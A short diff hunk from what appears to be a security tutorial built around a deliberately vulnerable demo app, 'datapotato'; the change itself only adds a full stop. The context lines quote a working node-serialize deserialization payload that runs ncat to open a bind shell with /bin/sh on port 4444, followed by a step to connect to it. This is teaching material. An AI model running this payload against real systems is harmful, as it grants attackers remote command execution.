@@ -619,7 +619,7 @@ These vulnerabilities will be explored through a demonstration app, datapotato:
   {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat -nlvp 4444 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout) });}()"}
   ```
   
-  In a command line terminal, preferably linux, connect to the bind shell
+  In a command line terminal, preferably linux, connect to the bind shell.
   
   If visiting the web application on our AWS instance:
   
